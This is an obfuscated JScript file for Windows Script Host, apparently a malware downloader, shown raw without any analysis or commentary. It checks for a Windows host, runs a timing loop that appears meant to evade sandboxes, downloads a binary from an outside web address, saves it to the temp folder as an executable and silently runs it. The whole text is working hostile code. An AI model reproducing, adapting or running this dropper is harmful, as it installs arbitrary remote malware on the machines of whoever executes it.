var E = false;
var IF = "CreateObject";
var wS = function j() {return WScript[IF]("WScript.Shell");}(), o = 11;
var b = "MSXML2.XMLHTTP";
var P = 2123213;
var QJ = 0;
function f(Y){wS["Run"](Y, QJ, QJ);};
function Bg(){return "" + b;};
function fJ(i1, z){QJ = QJ * 1; return i1 - z;};
function f0(){return IF;};
/*@cc_on
  @if (@_win32 || @_win64)
    E = true;
  @end
@*/
if (E)
{
var Z = "";
function t(){return 22;};
var W0 = 0; var v = 0;
function zy()
{
var W = new this["Date"]();
var Z0 = W["getUTCMilliseconds"]();
WScript["Sleep"](t());
var W = new this["Date"]();
var pP = W["getUTCMilliseconds"]();
WScript["Sleep"](t());
var W = new this["Date"]();
var l = W["getUTCMilliseconds"]();
var W0 = "SW";
W0 = fJ(pP, Z0);
var v = "Ou";
v = fJ(l, pP);
Z = "open";
return fJ(W0, v);
}
var A = false;
var vr = false;
for (var Zw = QJ; Zw < t() * 1; Zw++){if (zy() != QJ){
A = true; 
v = "31" + 11 * W0 + v; 
vr = true; 
break;
}}
function UV() {return ((A == true) && (A == vr)) ? 1 : QJ;};
if (A && UV() && vr){
function AN() {return wS["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "uP4vBqajmt.exe";};
 hj = Bg();
 Lp = WScript[IF](hj);
 var LH = 1;
 while (LH){
try {
Lp[Z]("GET", "http://cngfloristsundries.co.uk/mo4erp", false);
Lp["send"]();
wD = "Sleep";
for (;;){WScript[wD](t() * 11); if (Lp["readystate"] >= 2 * 2) break;};
LH = QJ;
} catch(Qx){};
}
function i(po) {var Ct = (1, 2, 3, 4, 5, po); return Ct;};
i0 = WScript[f0()]("ADODB.Stream");
hj = i0;
hj[Z]();
hj["type"] = i(1);
hj["write"](Lp["ResponseBody"]);
i0["position"] = i(QJ);
hj["Save" + "ToFile"](AN(), 2);
i0["c"+"lose"]();
j0 = AN();
f(j0);
}
}

